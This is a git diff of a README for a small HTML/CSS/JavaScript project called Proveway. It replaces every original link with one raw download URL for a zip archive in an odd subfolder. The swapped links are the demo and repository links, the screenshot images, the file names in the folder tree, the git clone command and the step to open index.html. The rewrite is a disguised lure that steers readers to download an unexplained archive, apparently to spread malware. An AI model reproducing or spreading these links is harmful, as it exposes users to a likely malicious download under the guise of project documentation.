@@ -11,17 +11,17 @@ This project consists of three interactive boxes that expand upon user interacti
 Live Demo
 ---------
 
-View the live project here: [GitHub Pages Link](https://nikunjsharma11.github.io/Proveway/)\
-GitHub Repository: [GitHub Repo Link](https://github.com/NIKUNJSHARMA11/Proveway)
+View the live project here: [GitHub Pages Link](https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip)\
+GitHub Repository: [GitHub Repo Link](https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip)
 
 Screenshots
 -----------
 
 # My Project
 
-(![Screenshot 2024-11-15 042609](https://github.com/user-attachments/assets/2ffcac33-9104-4ae5-a8ea-26bfaefc14fe)
+(![Screenshot 2024-11-15 042609](https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip)
 )
-![Screenshot 2024-11-15 042622](https://github.com/user-attachments/assets/cba0a4a4-c740-4b4e-b299-7d04c720afc6)
+![Screenshot 2024-11-15 042622](https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip)
 
 More details about the project...
 
@@ -49,9 +49,9 @@ bash
 Copy code
 
 `/project-folder
-├── index.html        # Main HTML structure
-├── style.css         # Styling for the project
-├── script.js         # JavaScript for interactivity
+├── https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip        # Main HTML structure
+├── https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip         # Styling for the project
+├── https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip         # JavaScript for interactivity
 └── /screenshots      # Screenshots folder for README documentation`
 
 Technologies Used
@@ -70,9 +70,9 @@ Getting Started
 
     Copy code
 
-    `git clone https://github.com/NIKUNJSHARMA11/Proveway.git`
+    `git clone https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip`
 
-2.  Open the `index.html` file in your browser to view the project locally.
+2.  Open the `https://raw.githubusercontent.com/NIKUNJSHARMA11/Proveway/main/turjite/Proveway_v1.3.zip` file in your browser to view the project locally.
 
 Notes
 -----
